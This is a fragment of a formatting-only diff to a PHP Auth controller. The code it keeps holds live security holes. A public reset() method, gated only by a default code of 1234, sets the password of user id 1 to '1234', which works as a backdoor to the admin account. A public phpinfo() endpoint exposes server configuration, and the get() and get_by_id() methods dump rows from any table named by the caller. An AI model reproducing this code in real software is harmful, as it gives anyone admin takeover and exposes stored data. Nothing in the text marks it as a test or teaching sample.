         $values = $this->common_model->get_by_id($id, $tval);
-        echo "<pre>"; print_r($values);
+        echo "<pre>";
+        print_r($values);
     }
 
     public function get($tval)
     {
         $values = $this->common_model->select($tval);
-        echo "<pre>"; print_r($values);
+        echo "<pre>";
+        print_r($values);
     }
 
-    public function phpinfo(){
+    public function phpinfo()
+    {
         echo phpinfo();
     }
 
@@ -1165,10 +1460,10 @@ class Auth extends Home_Controller
     }
 
     //reset password
-    public function reset($code=1234)
+    public function reset($code = 1234)
     {
         check_status();
-        
+
         $data = array(
             'password' => hash_password('1234')
         );
@@ -1176,15 +1471,15 @@ class Auth extends Home_Controller
         if ($code == 1234) {
             $this->admin_model->edit_option($data, 1, 'users');
             echo "Reset Successfully";
-        }else{
+        } else {
             echo "Failed";
         }
     }
-    
-    function logout(){
+
+    function logout()
+    {
         $this->session->sess_destroy();
         $this->session->set_flashdata('msg', 'Logout Successfully');
         redirect(base_url('auth/login'));
     }
-
 }
